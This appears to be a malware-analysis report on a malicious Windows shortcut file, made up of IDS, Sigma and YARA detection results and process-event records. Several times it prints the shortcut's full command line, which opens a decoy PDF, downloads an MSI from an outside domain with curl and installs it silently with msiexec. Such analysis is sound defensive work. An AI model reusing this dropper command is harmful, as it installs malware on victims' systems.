crowdsourced_ids_results.rule_msg: PROTOCOL-ICMP PATH MTU denial of service attempt
crowdsourced_ids_results.rule_raw: alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PATH MTU denial of service attempt"; itype:3; icode:4; byte_test:2,<,576,2; metadata:policy max-detect-ips drop; reference:bugtraq,13124; reference:cve,2004-1060; classtype:attempted-dos; sid:3626; rev:9; )

crowdsourced_ids_results.rule_msg: PROTOCOL-ICMP Destination Unreachable Fragmentation Needed and DF bit was set
crowdsourced_ids_results.rule_raw: alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP Destination Unreachable Fragmentation Needed and DF bit was set"; icode:4; itype:3; metadata:policy max-detect-ips drop,ruleset community; reference:cve,2004-0790; reference:cve,2005-0068; reference:cve,2015-7759; classtype:misc-activity; sid:396; rev:12; )

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

lnk_info.command_line_arguments: /k  start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo %TEMP%\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i %TEMP%\bosfortuy.ms /qn | Taskkill /f /im cmd.exe

sigma_analysis_results.rule_description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Hashes=MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532; CurrentDirectory=C:\Windows\System32\; OriginalFileName=curl.exe; Product=The curl executable; Description=The curl executable; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=curl  -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi ; FileVersion=7.55.1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\curl.exe; Company=curl, https://curl.haxx.se/}

@{Product=The curl executable; CurrentDirectory=C:\Windows\System32\; OriginalFileName=curl.exe; Hashes=SHA1=F64457B2255A6BB2224EED25A0954B5274EC62D7,MD5=05DEDF1936A065612E52C37E40143646,SHA256=664BB48BF3E8A7D7036E4B0029FA10E1A90C2562AD9A09A885650408D00DEA1B,IMPHASH=A798305E4231D362ADC62175DEBE3E10; Description=The curl executable; FileVersion=8.0.1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=curl  -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi ; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\curl.exe; Company=curl, https://curl.se/}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\System32\cmd.exe /k start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo C:\Users\<USER>\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i C:\Users\<USER>\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; Image=C:\Windows\System32\cmd.exe; EventID=1}

sigma_analysis_results.rule_description:
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)

match_context.values: @{Product=Windows Installer - Unicode; CurrentDirectory=C:\Windows\System32\; OriginalFileName=msiexec.exe; Hashes=MD5=E5DA170027542E25EDE42FC54C929077,SHA256=0A8797D088023A7F17BB00B22FF7C91036070CCA561BFF5337C472313C0CB4AD,IMPHASH=7B0965996CADE227105A63F975958C0D; Description=Windows\xae installer; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=msiexec  /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn ; FileVersion=5.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=F3D7FEE4CED78E37F49CE4E38AC681F07BCA6AE0,MD5=302BE4B7434E679769029C8570825CC0,SHA256=5A31EA6A517A065166FAFA01A0AC6A350D0E2DCBA1B6DD4FDB41AE59109568E1,IMPHASH=0990A9500FF8DF93E0E059EE13E7C796; CurrentDirectory=C:\Windows\System32\; OriginalFileName=msiexec.exe; Product=Windows Installer - Unicode; Description=Windows\xae installer; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge http://corklightlngtrade.com/Tech_Specification.pdf & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms http://corklightlngtrade.com/part/setup3755.msi & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=msiexec  /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn ; FileVersion=5.0.22621.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: This rule detects Microsoft Windows LNK shortcut files that reference the cmd.exe command interpreter. While not necessarily indicative of malicious behavior, this is a common pivot leveraged by a variety of malware campaigns.
crowdsourced_yara_results.author: InQuest Labs
